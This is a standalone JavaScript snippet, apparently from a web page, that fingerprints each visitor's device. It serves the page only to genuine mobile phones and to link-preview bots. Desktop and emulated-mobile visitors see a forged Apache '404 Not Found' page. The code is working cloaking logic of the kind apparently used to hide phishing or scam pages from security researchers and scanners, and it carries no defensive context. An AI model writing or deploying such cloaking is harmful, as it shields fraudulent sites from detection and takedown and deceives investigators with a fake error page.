function d4() {
      try {
        var ua = navigator.userAgent || '';
        var isLocal = /localhost|127\.0\.0\.1|::1/i.test(location.hostname);
        var isAndroidUA = /android/i.test(ua);
        var isIosUA = /iphone|ipad|ipod/i.test(ua);
        if (isLocal || isAndroidUA || isIosUA) return;

        var isM = /android|iphone|ipad|mobile|windows phone|opera mini/i.test(ua);
        var isBot = /telegrambot|curl|wget|python|okhttp|postman|java|go-http|whatsapp|slack|facebookexternalhit/i.test(ua);
        var uaFake = false;
        if (isM && !isBot) {
          var plat = (navigator.platform || '').toLowerCase();
          var fakePlatBad = false;
          if (/win/.test(plat) && !isAndroidUA && !isIosUA) fakePlatBad = true;
          if (/linux/.test(plat) && !isAndroidUA) fakePlatBad = true;
          var touch = parseInt(navigator.maxTouchPoints || '0', 10);
          var noTouch = touch < 2;
          var fine = false;
          try { if (window.matchMedia) fine = window.matchMedia('(pointer: fine)').matches; } catch (e) { }
          var hoverOk = false;
          try { if (window.matchMedia) hoverOk = window.matchMedia('(hover: hover)').matches; } catch (e) { }
          var uaData = null;
          try { if (navigator.userAgentData) uaData = navigator.userAgentData; } catch (e) { }
          if (uaData) {
            var pNorm = String(uaData.platform || '').toLowerCase();
            if (uaData.mobile === false) uaFake = true;
            if (/windows|chrome os/.test(pNorm)) uaFake = true;
            if (/macos/.test(pNorm) && noTouch) uaFake = true;
            if (/linux/.test(pNorm) && !isAndroidUA) uaFake = true;
          }
          if (fakePlatBad) uaFake = true;
          if (noTouch && fine && hoverOk) uaFake = true;
        }
        if (uaFake || (!isM && !isBot)) {
          if (typeof window.stop === 'function') try { window.stop(); } catch (e) { }
          var nf = '<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL ' + location.pathname + ' was not found on this server.</p><hr><address>Apache/2.4.58 (Ubuntu) Server at ' + location.host + ' Port 80</address></body></html>';
          try { document.body.innerHTML = nf; } catch (e) { try { document.open(); document.write(nf); document.close(); } catch (e2) { } }
        }
      } catch (e) { }
    }
    d4();